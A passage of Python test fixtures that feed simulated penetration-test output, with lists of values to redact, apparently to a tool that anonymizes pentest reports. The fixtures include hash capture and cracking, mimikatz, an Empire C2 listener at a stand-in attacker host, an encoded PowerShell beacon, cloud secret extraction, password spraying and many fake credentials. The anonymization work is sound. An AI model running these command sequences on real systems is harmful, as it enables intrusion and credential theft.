          "endpoint": "stratus-rds-prod.c9x8y7z6.us-east-1.rds.amazonaws.com",
          "username": "stratus_dba",
          "password": "Stratus#RDSPr0d2024!",
          "db_name": "stratus_production"
        }
      }]
    },
    {
      "type": "aws_secretsmanager_secret_version",
      "name": "stratus-api-key",
      "instances": [{
        "attributes": {
          "secret_string": "{\\"api_key\\":\\"sk_live_StratusProd4Xy9K2pLmN8qRvT3sU5x\\",\\"webhook\\":\\"whsec_StratusWH9876543210AbCdEfGh\\"}"
        }
      }]
    }
  ]
}
""",
    must_anonymize=[
        "i-0a1b2c3d4e5f67890",
        "10.50.1.45", "54.23.87.156",
        "devops@stratustech.io", "stratustech.io",
        "stratus-rds-prod.c9x8y7z6.us-east-1.rds.amazonaws.com",
        "stratus_dba", "Stratus#RDSPr0d2024!",
        "stratus_production",
        "sk_live_StratusProd4Xy9K2pLmN8qRvT3sU5x",
        "whsec_StratusWH9876543210AbCdEfGh",
    ],
    safe_to_keep=[
        "terraform", "aws_instance", "aws_db_instance",
        "aws_secretsmanager_secret_version",
        "t3.medium", "version", "identifier",
    ],
)

GIT_CREDENTIAL_EXPOSURE = PentestFixture(
    name="git_credential_exposure",
    description="Git history with hardcoded credentials found via trufflehog/gitrob — DB passwords and API keys",
    text="""\
$ git log --oneline --all
a3f82b1 (HEAD -> main) Remove hardcoded credentials — security review
b1c2d3e Add Dockerfile for prod deployment
e1f2a3b [2023-12-05] Add .env for staging (accidentally committed)

$ git show a3f82b1
commit a3f82b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9
Author: carlos.mendoza <carlos.mendoza@fabricorp.com>
Date:   Mon Feb 12 11:34:51 2024 -0300

    Remove hardcoded credentials — security review

diff --git a/config/database.yml b/config/database.yml
-  host: db-primary.fabricorp.internal
-  username: fabrica_app
-  password: FabriC0rpProd#2024!
+  host: ${{DB_HOST}}
+  username: ${{DB_USER}}
+  password: ${{DB_PASSWORD}}

diff --git a/app/payment.py b/app/payment.py
-STRIPE_API_KEY = "sk_live_fabri4Xy9K2pLmN8qRvT3sU5xAB"
-TWILIO_AUTH_TOKEN = "f1e2d3c4b5a6978869584a3b2c1d0e9f"
+STRIPE_API_KEY = os.environ.get("STRIPE_API_KEY")

$ git show e1f2a3b
commit e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0
Author: lucas.ferreira <lucas.ferreira@fabricorp.com>
Date:   Tue Dec  5 14:22:10 2023 -0300

    Add .env for staging

+DB_HOST=db-primary.fabricorp.internal
+DB_USER=fabrica_app
+DB_PASS=FabriC0rpProd#2024!
+REDIS_PASS=FabriCache!2024
+SENDGRID_API_KEY=SG.fabri_sg_Kx7mN2pQ4rT6vY8wA1bC.xxxxxxxxxxxxxxxxxxxxxxxxx
""",
    must_anonymize=[
        "carlos.mendoza@fabricorp.com", "lucas.ferreira@fabricorp.com",
        "fabricorp.com", "fabricorp.internal",
        "db-primary.fabricorp.internal",
        "fabrica_app", "FabriC0rpProd#2024!",
        "f1e2d3c4b5a6978869584a3b2c1d0e9f",
        "sk_live_fabri4Xy9K2pLmN8qRvT3sU5xAB",
        "FabriCache!2024",
        "SG.fabri_sg_Kx7mN2pQ4rT6vY8wA1bC.xxxxxxxxxxxxxxxxxxxxxxxxx",
    ],
    safe_to_keep=[
        "git", "commit", "diff", "Author", "Date",
        "DB_HOST", "DB_USER", "DB_PASS", "REDIS_PASS",
        "STRIPE_API_KEY", "SENDGRID_API_KEY",
    ],
)

RESPONDER_NTLMV2 = PentestFixture(
    name="responder_ntlmv2_capture",
    description="Responder LLMNR/NBT-NS poisoning — NTLMv2 hash capture + hashcat cracking",
    text="""\
[+] Listening for events...
[*] [NBT-NS] Poisoned answer sent to 10.30.5.15 for name FILESERVER
[*] [LLMNR]  Poisoned answer sent to 10.30.5.22 for name backup-srv

[SMB] NTLMv2-SSP Client   : 10.30.5.15
[SMB] NTLMv2-SSP Username : QUANTEX\\rafael.moura
[SMB] NTLMv2-SSP Hash     : rafael.moura::QUANTEX:aabbccdd11223344:1a2b3c4d5e6f7a8b9c0d1e2f00112233:0101000000000000c0

[SMB] NTLMv2-SSP Client   : 10.30.5.22
[SMB] NTLMv2-SSP Username : QUANTEX\\carla.nascimento
[SMB] NTLMv2-SSP Hash     : carla.nascimento::QUANTEX:11223344aabbccdd:9f8e7d6c5b4a39280011223344556677:01010000000000

[HTTP] NTLMv2 Client   : 10.30.5.45
[HTTP] NTLMv2 Username : QUANTEX\\ti.helpdesk
[HTTP] NTLMv2 Hash     : ti.helpdesk::QUANTEX:deadbeefcafebabe:abcdef0123456789:01010000

Saved to /home/operator/responder/QUANTEX_hashes.txt

$ hashcat -m 5600 QUANTEX_hashes.txt /usr/share/wordlists/rockyou.txt
rafael.moura::QUANTEX:aabbccdd11223344:...:Quantex@2024!
carla.nascimento::QUANTEX:11223344aabbccdd:...:Nascimento#123

Cracked credentials:
  QUANTEX\\rafael.moura / Quantex@2024!
  QUANTEX\\carla.nascimento / Nascimento#123
""",
    must_anonymize=[
        "10.30.5.15", "10.30.5.22", "10.30.5.45",
        "QUANTEX",
        "rafael.moura", "carla.nascimento", "ti.helpdesk",
        "aabbccdd11223344", "1a2b3c4d5e6f7a8b9c0d1e2f00112233",
        "11223344aabbccdd", "9f8e7d6c5b4a39280011223344556677",
        "deadbeefcafebabe", "abcdef0123456789",
        "/home/operator/responder/QUANTEX_hashes.txt",
        "Quantex@2024!", "Nascimento#123",
    ],
    safe_to_keep=[
        "LLMNR", "NBT-NS", "SMB", "HTTP",
        "NTLMv2", "hashcat", "rockyou.txt", "NTLMv2-SSP",
    ],
)

LINPEAS_OUTPUT = PentestFixture(
    name="linpeas_privesc",
    description="LinPEAS Linux privilege escalation scan — credential files, .env, SUID, interesting users",
    text="""\
╔══════════╣ Analyzing .env Files (/.env, /var/www/.env, /etc/*.env)
╚ /var/www/praxis-portal/config/.env
APP_KEY=base64:mN8qRvT3sU5xYzAbCdEfGhIjKlMnOpQr==
DB_HOST=db-primary.praxis.internal
DB_DATABASE=praxis_prod
DB_USERNAME=praxis_web
DB_PASSWORD=Praxis#WebPr0d2024!
MAIL_PASSWORD=PraxisSMTP@2024
REDIS_HOST=cache.praxis.internal
REDIS_PASSWORD=PraxisR3d1s!2024

╔══════════╣ Sudo version 1.9.5p2

╔══════════╣ Checking sudo -l
User deploy can run the following commands on praxis-srv01:
    (ALL) NOPASSWD: /usr/bin/docker

╔══════════╣ Interesting Users
Username: carla.santos
Groups:   docker,adm
Home:     /home/carla.santos
Last Login: Fri Mar 15 09:12:04 2024 from 10.30.5.22

Username: deploy
Groups:   docker,www-data
Home:     /home/deploy

╔══════════╣ Files with credentials (common locations)
/home/deploy/.aws/credentials
[default]
aws_access_key_id = AKIAIOSFODNN7PRAXIS1
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiPRAXIS2024KY

╔══════════╣ Interesting writable files owned by me or writable by everyone
/var/www/praxis-portal/storage/logs/praxis-prod.log
""",
    must_anonymize=[
        "praxis-portal", "praxis.internal",
        "db-primary.praxis.internal", "cache.praxis.internal",
        "praxis_prod", "praxis_web",
        "Praxis#WebPr0d2024!", "PraxisSMTP@2024", "PraxisR3d1s!2024",
        "praxis-srv01",
        "carla.santos",
        "10.30.5.22",
        "AKIAIOSFODNN7PRAXIS1",
        "wJalrXUtnFEMI/K7MDENG/bPxRfiPRAXIS2024KY",
        "deploy",
        "/var/www/praxis-portal/config/.env",
        "/home/deploy/.aws/credentials",
    ],
    safe_to_keep=[
        "linpeas", "docker", "sudo", "NOPASSWD",
        "APP_KEY", "DB_HOST", "DB_DATABASE", "DB_USERNAME", "DB_PASSWORD",
        "MAIL_PASSWORD", "REDIS_HOST", "REDIS_PASSWORD",
        "aws_access_key_id", "aws_secret_access_key",
        "www-data", "adm",
    ],
)

AWS_IAM_PRIVESC = PentestFixture(
    name="aws_iam_privilege_escalation",
    description="AWS IAM enumeration → privilege escalation via misconfigured policy — org-specific resource names",
    text="""\
$ aws sts get-caller-identity
{
    "UserId": "AIDAXXXXXXXXJULIA001",
    "Account": "987654321098",
    "Arn": "arn:aws:iam::987654321098:user/dev-julia.santos"
}

$ aws iam list-attached-user-policies --user-name dev-julia.santos
{
    "AttachedPolicies": [
        {
            "PolicyName": "ApexDevReadWrite",
            "PolicyArn": "arn:aws:iam::987654321098:policy/ApexDevReadWrite"
        }
    ]
}

$ aws iam create-access-key --user-name dev-julia.santos
{
    "AccessKey": {
        "UserName": "dev-julia.santos",
        "AccessKeyId": "AKIAIOSFODNN7APEX010",
        "Status": "Active",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYAPEX2024KY"
    }
}

$ export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7APEX010
$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYAPEX2024KY
$ aws s3 ls
2024-01-10  apex-prod-backups
2024-02-05  apex-dev-artifacts
2023-11-20  apex-staging-data

$ aws secretsmanager get-secret-value --secret-id apex-db-prod-creds
{
    "SecretString": "{\\"username\\":\\"apex_dba\\",\\"password\\":\\"Apex#DBPr0d2024!\\"}"
}
""",
    must_anonymize=[
        "AIDAXXXXXXXXJULIA001",
        "987654321098",
        "dev-julia.santos",
        "arn:aws:iam::987654321098:user/dev-julia.santos",
        "ApexDevReadWrite",
        "arn:aws:iam::987654321098:policy/ApexDevReadWrite",
        "AKIAIOSFODNN7APEX010",
        "wJalrXUtnFEMI/K7MDENG/bPxRfiCYAPEX2024KY",
        "apex-prod-backups", "apex-dev-artifacts", "apex-staging-data",
        "apex-db-prod-creds",
        "apex_dba", "Apex#DBPr0d2024!",
    ],
    safe_to_keep=[
        "aws", "sts", "iam", "s3", "secretsmanager",
        "get-caller-identity", "list-attached-user-policies",
        "create-access-key", "get-secret-value",
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
        "UserId", "Account", "Arn", "PolicyName", "PolicyArn",
        "SecretString",
    ],
)


GOPHISH_CAMPAIGN = PentestFixture(
    name="gophish_phishing_campaign",
    description="GoPhish campaign results — phishing emails sent, credential captures, click tracking",
    text="""\
Campaign: Omega Corp IT Security Awareness
From: it-security@omega-corp.com.br
Landing Page: https://secure-login.omega-helpdesk.com/reset

Summary (2024-03-15):
  Emails Sent  : 45
  Emails Opened: 28
  Links Clicked: 19
  Credentials  : 12

Timeline (credentials captured):
  09:46:45  203.45.67.89     carlos.mendez@omega-corp.com.br  Omega@Web2024!
  10:12:03  10.50.1.88       ana.lima@omega-corp.com.br        Ana@Corp123!
  10:34:17  203.45.67.91     roberto.nunes@omega-corp.com.br   Rob3rto#2024
  11:05:52  203.45.99.201    ti.helpdesk@omega-corp.com.br     TI@Helpdesk2024!

SMTP Relay: smtp.omega-corp.com.br
Sending Profile: omega-corp-smtp
""",
    must_anonymize=[
        "omega-corp.com.br", "omega-helpdesk.com",
        "it-security@omega-corp.com.br",
        "carlos.mendez@omega-corp.com.br", "Omega@Web2024!",
        "ana.lima@omega-corp.com.br", "Ana@Corp123!",
        "roberto.nunes@omega-corp.com.br", "Rob3rto#2024",
        "ti.helpdesk@omega-corp.com.br", "TI@Helpdesk2024!",
        "203.45.67.89", "10.50.1.88", "203.45.67.91", "203.45.99.201",
        "smtp.omega-corp.com.br",
    ],
    safe_to_keep=[
        "GoPhish", "Campaign", "SMTP", "Relay",
        "Emails", "Credentials", "Timeline",
    ],
)

SHODAN_RECON = PentestFixture(
    name="shodan_osint_recon",
    description="Shodan CLI — organization enumeration, exposed services, SSL certificate details",
    text="""\
$ shodan search org:"Helios Energia" port:3389
73.55.88.201   3389   Helios Energia
  OS: Windows Server 2019
  SSL: CN=HELIOS-TERM02, O=Helios Energia, C=BR

73.55.88.202   3389   Helios Energia
  OS: Windows Server 2019
  SSL: CN=HELIOS-RDP01, O=Helios Energia, C=BR

$ shodan host 73.55.88.201
IP: 73.55.88.201
Organization: Helios Energia
ASN: AS12345
Hostnames: rdp.heliosenergia.com.br
Ports: 80, 443, 3389

  443/https
  Server: nginx/1.18.0 (Ubuntu)
  Title: Helios Energia — Portal do Colaborador

$ shodan host 73.55.88.202
IP: 73.55.88.202
Organization: Helios Energia
Hostnames: term.heliosenergia.com.br
""",
    must_anonymize=[
        "Helios Energia",
        "HELIOS-TERM02", "HELIOS-RDP01",
        "73.55.88.201", "73.55.88.202",
        "rdp.heliosenergia.com.br", "term.heliosenergia.com.br",
        "heliosenergia.com.br",
    ],
    safe_to_keep=[
        "shodan", "org", "port", "nginx", "Ubuntu",
        "Windows Server 2019", "SSL", "Ports", "ASN",
        "Organization",
    ],
)

CLOUDTRAIL_LOGS = PentestFixture(
    name="aws_cloudtrail_logs",
    description="AWS CloudTrail audit log — IAM privilege escalation events with user ARNs and IPs",
    text="""\
{
  "Records": [
    {
      "eventVersion": "1.08",
      "userIdentity": {
        "type": "IAMUser",
        "principalId": "AIDAJX7WYLKUQ4PIMB3QA",
        "arn": "arn:aws:iam::445566778899:user/roberto.alves",
        "accountId": "445566778899",
        "userName": "roberto.alves"
      },
      "eventName": "CreateAccessKey",
      "sourceIPAddress": "203.44.55.66",
      "requestParameters": {
        "userName": "svc_deploy"
      },
      "responseElements": {
        "accessKey": {
          "accessKeyId": "AKIAJX7WYLKUQ4APXA01A",
          "userName": "svc_deploy",
          "status": "Active"
        }
      }
    },
    {
      "userIdentity": {
        "type": "IAMUser",
        "principalId": "AIDAJX7WYLKUQ4PIMB3QA",
        "arn": "arn:aws:iam::445566778899:user/roberto.alves",
        "accountId": "445566778899"
      },
      "eventName": "AttachUserPolicy",
      "sourceIPAddress": "203.44.55.66",
      "requestParameters": {
        "userName": "svc_deploy",
        "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
      }
    }
  ]
}
""",
    must_anonymize=[
        "AIDAJX7WYLKUQ4PIMB3QA",
        "arn:aws:iam::445566778899:user/roberto.alves",
        "445566778899",
        "roberto.alves",
        "203.44.55.66",
        "AKIAJX7WYLKUQ4APXA01A",
        "svc_deploy",
    ],
    safe_to_keep=[
        "aws", "iam", "IAMUser", "CreateAccessKey", "AttachUserPolicy",
        "AdministratorAccess", "Active", "Records",
        "eventName", "sourceIPAddress", "accountId",
    ],
)


EMPIRE_C2 = PentestFixture(
    name="empire_c2_session",
    description="PowerShell Empire C2 — agent checkin, credential gathering, lateral movement",
    text="""\
(Empire) > agents

[*] Active agents:

 Name        Lang  Internal IP   Machine Name   Username         Process
 ----------  ----  ------------  -------------  ---------------  ---------------
 ABCD1234    ps    172.16.5.20   VORTEX-PC01    VORTEX\\pablo.santos  powershell/5820
 EFGH5678    ps    172.16.5.35   VORTEX-SRV02   VORTEX\\svc_web  powershell/7204

(Empire: agents) > interact ABCD1234
(Empire: ABCD1234) > usemodule credentials/mimikatz/logonpasswords
(Empire: ABCD1234) > run

Job started: Debug32_abc12

[*] Tasked ABCD1234 to run TASK_CMD_JOB
[*] Agent ABCD1234 returned results

Authentication Id : 0 ; 99821 (00000000:000185cd)
User Name         : pablo.santos
Domain            : VORTEX
NTLM              : 3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f80
Password          : V0rt3x@Pablo2024!

Authentication Id : 0 ; 996
User Name         : svc_web
Domain            : VORTEX
NTLM              : aabbccddeeff00112233445566778899

(Empire: ABCD1234) > shell net user fernanda.rocha /domain
Full Name                    Fernanda Rocha
Account active               Yes
Last logon                   3/14/2024 10:22:31 AM

(Empire: ABCD1234) > usemodule lateral_movement/invoke_psremoting
(Empire: ABCD1234) > set ComputerName VORTEX-SRV02
(Empire: ABCD1234) > set Listener http://c2.attacker.io:8080
""",
    must_anonymize=[
        "172.16.5.20", "172.16.5.35",
        "VORTEX-PC01", "VORTEX-SRV02",
        "VORTEX",
        "pablo.santos", "svc_web",
        "3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f80",
        "V0rt3x@Pablo2024!",
        "aabbccddeeff00112233445566778899",
        "fernanda.rocha", "Fernanda Rocha",
        "c2.attacker.io",
    ],
    safe_to_keep=[
        "Empire", "agents", "mimikatz", "logonpasswords",
        "powershell", "NTLM", "Domain", "lateral_movement",
        "http", "TASK_CMD_JOB",
    ],
)

PACU_AWS_ENUM = PentestFixture(
    name="pacu_aws_enumeration",
    description="Pacu AWS exploitation framework — IAM enum, S3 data, secrets, EC2 instances",
    text="""\
Pacu (omegacorp_session:No Keys Set) > import_keys omegacorp_admin
  Imported keys as "omegacorp_admin"

Pacu (omegacorp_session:omegacorp_admin) > run iam__enum_users_roles_policies_groups
  Running module iam__enum_users_roles_policies_groups...
  Users found: 3
    ana.lima (arn:aws:iam::112233445566:user/ana.lima)
    deploy_bot (arn:aws:iam::112233445566:user/deploy_bot)
    svc_lambda (arn:aws:iam::112233445566:user/svc_lambda)

Pacu (omegacorp_session:omegacorp_admin) > run s3__download_bucket --bucket omegacorp-data-prod
  Running module s3__download_bucket...
  [+] Downloading: s3://omegacorp-data-prod/exports/employees_2024.csv
  [+] Downloading: s3://omegacorp-data-prod/backups/db_dump_20240315.sql.gz
  [+] Files saved to /home/operator/pacu/sessions/omegacorp_session/downloads/

Pacu (omegacorp_session:omegacorp_admin) > run secrets_manager__enum
  Secret: omegacorp/prod/db-credentials
    username: omega_dba
    password: Omega#DBProd2024!
  Secret: omegacorp/prod/jwt-secret
    value: jwtS3cr3tOmega2024XYZ

Pacu (omegacorp_session:omegacorp_admin) > run ec2__enum
  Instance: i-0b1c2d3e4f5a6b7c8
    Name: omegacorp-api-prod
    Private IP: 10.40.1.25
    Public IP: 44.55.66.77
""",
    must_anonymize=[
        "omegacorp_admin", "omegacorp_session",
        "112233445566",
        "ana.lima", "deploy_bot", "svc_lambda",
        "arn:aws:iam::112233445566:user/ana.lima",
        "arn:aws:iam::112233445566:user/deploy_bot",
        "arn:aws:iam::112233445566:user/svc_lambda",
        "omegacorp-data-prod",
        "omegacorp/prod/db-credentials", "omegacorp/prod/jwt-secret",
        "omega_dba", "Omega#DBProd2024!",
        "jwtS3cr3tOmega2024XYZ",
        "i-0b1c2d3e4f5a6b7c8",
        "omegacorp-api-prod",
        "10.40.1.25", "44.55.66.77",
    ],
    safe_to_keep=[
        "iam__enum_users_roles_policies_groups",
        "s3__download_bucket", "secrets_manager__enum", "ec2__enum",
        "aws", "iam", "s3", "ec2", "Private", "Public",
    ],
)

VOLATILITY_FORENSICS = PentestFixture(
    name="volatility_memory_forensics",
    description="Volatility 3 memory dump analysis — process list, credentials, network connections",
    text="""\
$ vol -f /evidence/meridional-dc01.vmem windows.pslist
PID   PPID  ImageFileName     CreateTime
4     0     System
688   4     smss.exe
836   688   csrss.exe
1024  836   winlogon.exe
1748  836   lsass.exe          2024-03-10 08:14:22
2156  1748  svchost.exe
3820  3204  powershell.exe     2024-03-10 09:47:15

$ vol -f /evidence/meridional-dc01.vmem windows.hashdump
User        RID   LMHash                           NTHash
meridional\\Administrator  500  aad3b435b51404eeaad3b435b51404ee  8aa4f96a3f24a7af0b8b2b9c5d4e3f21
meridional\\svc_backup     1104 aad3b435b51404eeaad3b435b51404ee  9bb5e7b4c35d8f92a1c3d4e5f6a7b8c9
meridional\\gustavo.pires  1105 aad3b435b51404eeaad3b435b51404ee  b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6

$ vol -f /evidence/meridional-dc01.vmem windows.netstat
Proto  LocalAddr                    ForeignAddr          State
TCPv4  10.80.0.5:445                10.80.0.22:51234     ESTABLISHED
TCPv4  10.80.0.5:3389               203.55.77.99:49120   ESTABLISHED

$ vol -f /evidence/meridional-dc01.vmem windows.cmdline --pid 3820
PID 3820 powershell.exe
Cmd: powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQ AgAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAzAC4AMQAuADUAOgA4ADAALwBiAGUAYQBjAG8AbgA=
""",
    must_anonymize=[
        "meridional-dc01.vmem",
        "meridional",
        "svc_backup", "gustavo.pires",
        "8aa4f96a3f24a7af0b8b2b9c5d4e3f21",
        "9bb5e7b4c35d8f92a1c3d4e5f6a7b8c9",
        "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6",
        "10.80.0.5", "10.80.0.22", "203.55.77.99",
    ],
    safe_to_keep=[
        "vol", "volatility", "windows.pslist", "windows.hashdump",
        "windows.netstat", "windows.cmdline",
        "lsass.exe", "powershell.exe", "svchost.exe",
        "Administrator",
        "TCPv4", "ESTABLISHED",
    ],
)


SAAS_CREDENTIAL_DUMP = PentestFixture(
    name="saas_credential_dump",
    description="SaaS API keys found in leaked .env / config repo — Slack, Square, Mailgun, Twilio, Shopify",
    text="""\
# Secrets found in leaked repository: victimco/backend-config

# .env.production
SLACK_BOT_TOKEN=xoxb-4752839021-4752839022-Kd7mN2pQ4rT6vY8wA1bC3dEf
SLACK_USER_TOKEN=xoxp-4752839021-4752839022-4752839023-Kd7mN2pQ4rT6vY8wA1bC3d
SQUARE_ACCESS_TOKEN=EAAAYhkDT5FdZpNvQ2rJ8bLwSxGcMnOPuViA3eFtHKqmXaCLbYdZnGoSpvRtJuWxAyBz
SQUARE_APP_ID=sq0idp-Kd7mN2pQ4rT6vY8wA1bCdE
MAILGUN_API_KEY=key-4a8d73f92b1c560eaf47d8e3b6a0c512
MAILCHIMP_API_KEY=4a8d73f92b1c560eaf47d8e3b6a0c512-us14
TWILIO_ACCOUNT_SID=ACa1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
TWILIO_AUTH_TOKEN=e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6
SHOPIFY_ACCESS_TOKEN=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
GOOGLE_MAPS_API_KEY=AIzaSyBd7mN2pQ4rT6vY8wA1bC3dEfGhIjKlMno

# Firebase service account
{
  "project_id": "victimco-prod-441210",
  "private_key_id": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
  "client_email": "firebase-adminsdk@victimco-prod-441210.iam.gserviceaccount.com"
}
""",
    must_anonymize=[
        "xoxb-4752839021-4752839022-Kd7mN2pQ4rT6vY8wA1bC3dEf",
        "xoxp-4752839021-4752839022-4752839023-Kd7mN2pQ4rT6vY8wA1bC3d",
        "EAAAYhkDT5FdZpNvQ2rJ8bLwSxGcMnOPuViA3eFtHKqmXaCLbYdZnGoSpvRtJuWxAyBz",
        "sq0idp-Kd7mN2pQ4rT6vY8wA1bCdE",
        "key-4a8d73f92b1c560eaf47d8e3b6a0c512",
        "4a8d73f92b1c560eaf47d8e3b6a0c512-us14",
        "ACa1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
        "e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6",
        "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",
        "AIzaSyBd7mN2pQ4rT6vY8wA1bC3dEfGhIjKlMno",
        "victimco-prod-441210",
        "firebase-adminsdk@victimco-prod-441210.iam.gserviceaccount.com",
        "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
    ],
    safe_to_keep=[
        "SLACK_BOT_TOKEN", "SLACK_USER_TOKEN", "SQUARE_ACCESS_TOKEN",
        "MAILGUN_API_KEY", "MAILCHIMP_API_KEY", "TWILIO_ACCOUNT_SID",
        "TWILIO_AUTH_TOKEN", "SHOPIFY_ACCESS_TOKEN", "GOOGLE_MAPS_API_KEY",
        "project_id", "private_key_id", "client_email",
    ],
)


WINPEAS_OUTPUT = PentestFixture(
    name="winpeas_privesc",
    description="WinPEAS Windows priv-esc scan — AutoLogon credentials, Credential Manager, scheduled tasks",
    text="""\
╔══════════╣ Looking for AutoLogon credentials
    DefaultDomainName         : NORDVENTO
    DefaultUserName           : svc_deploy
    DefaultPassword           : NordV3nt0Dep!2024

╔══════════╣ Credential Manager entries
  [!] CredentialManager entry found!
  Target     : Domain:target=rdp.nordvento.corp
  Type       : Domain Password
  Username   : NORDVENTO\\fernanda.oliveira
  Password   : Oliveira@Portal2024!

╔══════════╣ Unattend/Sysprep files
  [!] Found: C:\\Windows\\Panther\\Unattend.xml
      Setup username  : nordvento\\setup_admin
      Setup password  : AdminSetup!2023

╔══════════╣ Interesting Scheduled Tasks
  Name     : NordventoBackup
  Run As   : NORDVENTO\\svc_backup
  Cmd      : powershell.exe -ep bypass -File C:\\Scripts\\nordvento_backup.ps1

╔══════════╣ Interesting files in home dirs
  C:\\Users\\fernanda.oliveira\\Desktop\\notas_acesso.txt
  C:\\Users\\svc_deploy\\.ssh\\id_rsa
""",
    must_anonymize=[
        "NORDVENTO",
        "svc_deploy", "NordV3nt0Dep!2024",
        "rdp.nordvento.corp",
        "fernanda.oliveira", "Oliveira@Portal2024!",
        "setup_admin", "AdminSetup!2023",
        "svc_backup",
    ],
    safe_to_keep=[
        "winpeas", "AutoLogon", "CredentialManager", "Unattend",
        "powershell", "Domain", "Password", "Username",
        "DefaultDomainName", "DefaultUserName", "DefaultPassword",
    ],
)

THEHARVESTER_OSINT = PentestFixture(
    name="theharvester_osint",
    description="theHarvester OSINT — email addresses and subdomains from public sources",
    text="""\
*******************************************************************
*  theHarvester 4.6.0                                             *
*  Coded by Christian Martorella                                  *
*******************************************************************

[*] Target: heliostech.com.br
[*] Sources: google, bing, linkedin, dnsdumpster

Emails found: 6
------------------
c.ferreira@heliostech.com.br
rodrigo.lima@heliostech.com.br
ti@heliostech.com.br
ciso@heliostech.com.br
noreply@heliostech.com.br
suporte@heliostech.com.br

Hosts found: 7
---------------------
vpn.heliostech.com.br: 203.45.67.89
mail.heliostech.com.br: 203.45.67.90
intranet.heliostech.com.br
dev-portal.heliostech.com.br: 203.45.67.91
api.heliostech.com.br: 203.45.67.92
backup.heliostech.com.br: 10.0.5.50
fw01.heliostech.com.br: 203.45.67.1

IPs found: 5
-------------
203.45.67.89
203.45.67.90
203.45.67.91
203.45.67.92
203.45.67.1
""",
    must_anonymize=[
        "heliostech.com.br",
        "c.ferreira@heliostech.com.br",
        "rodrigo.lima@heliostech.com.br",
        "ti@heliostech.com.br",
        "ciso@heliostech.com.br",
        "vpn.heliostech.com.br", "mail.heliostech.com.br",
        "intranet.heliostech.com.br", "dev-portal.heliostech.com.br",
        "api.heliostech.com.br", "backup.heliostech.com.br",
        "fw01.heliostech.com.br",
        "203.45.67.89", "203.45.67.90", "203.45.67.91",
        "203.45.67.92", "203.45.67.1", "10.0.5.50",
    ],
    safe_to_keep=[
        "theHarvester", "google", "bing", "linkedin", "dnsdumpster",
        "Emails", "Hosts", "IPs",
    ],
)

AZURE_KEYVAULT_ENUM = PentestFixture(
    name="azure_keyvault_enum",
    description="Azure CLI — subscription/tenant enumeration, Key Vault secret extraction",
    text="""\
$ az account show
{
  "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "name": "Quantum Corp Production",
  "tenantId": "f0e1d2c3-b4a5-9678-cdef-012345678901",
  "user": {
    "name": "carlos.mendez@quantumcorp.com"
  }
}

$ az ad user list --output table
DisplayName        UserPrincipalName                 ObjectId
-----------------  --------------------------------  ------------------------------------
Carlos Mendez      carlos.mendez@quantumcorp.com     11111111-2222-3333-4444-555555555555
Maria Santos       maria.santos@quantumcorp.com      aaaabbbb-cccc-dddd-eeee-ffffffffffff
svc_webapp         svc_webapp@quantumcorp.com        12345678-abcd-ef01-2345-6789abcdef01

$ az keyvault secret show --vault-name quantum-prod-vault --name db-admin-password
{
  "id": "https://quantum-prod-vault.vault.azure.net/secrets/db-admin-password/1a2b",
  "value": "QuantumDB#Admin2024!"
}

$ az keyvault secret show --vault-name quantum-prod-vault --name smtp-credentials
{
  "id": "https://quantum-prod-vault.vault.azure.net/secrets/smtp-credentials/3c4d",
  "value": "QuantumSMTP@relay2024"
}

Tenant Name : Quantum Corp
""",
    must_anonymize=[
        "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
        "f0e1d2c3-b4a5-9678-cdef-012345678901",
        "carlos.mendez@quantumcorp.com",
        "maria.santos@quantumcorp.com",
        "svc_webapp@quantumcorp.com",
        "Carlos Mendez", "Maria Santos",
        "11111111-2222-3333-4444-555555555555",
        "aaaabbbb-cccc-dddd-eeee-ffffffffffff",
        "12345678-abcd-ef01-2345-6789abcdef01",
        "quantum-prod-vault",
        "quantum-prod-vault.vault.azure.net",
        "QuantumDB#Admin2024!", "QuantumSMTP@relay2024",
        "Quantum Corp",
    ],
    safe_to_keep=[
        "az", "account", "keyvault", "secret", "show",
        "DisplayName", "UserPrincipalName", "ObjectId",
        "id", "value", "tenantId",
    ],
)


# ── Cycle 4: CrackMapExec SMB, Burp Suite HTTP history, Zeek conn.log ─────────

CRACKMAPEXEC_SMB = PentestFixture(
    name="crackmapexec_smb_lateral",
    description="CrackMapExec SMB spray and share enumeration across subnet",
    text="""\
$ crackmapexec smb 10.20.0.0/24 -u administrador -p 'V3r@n0S3gur0!' --shares
SMB         10.20.0.10    445    AURORA-DC01      [*] Windows Server 2019 Build 17763 x64 (name:AURORA-DC01) (domain:aurora.local) (signing:True) (SMBv1:False)
SMB         10.20.0.11    445    AURORA-FS01      [*] Windows Server 2016 Build 14393 x64 (name:AURORA-FS01) (domain:aurora.local) (signing:False) (SMBv1:False)
SMB         10.20.0.12    445    AURORA-WKS05     [*] Windows 10 Build 19041 x64 (name:AURORA-WKS05) (domain:aurora.local) (signing:False) (SMBv1:False)
SMB         10.20.0.10    445    AURORA-DC01      [+] aurora.local\\administrador:V3r@n0S3gur0! (Pwn3d!)
SMB         10.20.0.11    445    AURORA-FS01      [+] aurora.local\\administrador:V3r@n0S3gur0! (Pwn3d!)
SMB         10.20.0.12    445    AURORA-WKS05     [-] aurora.local\\administrador:V3r@n0S3gur0! STATUS_LOGON_FAILURE

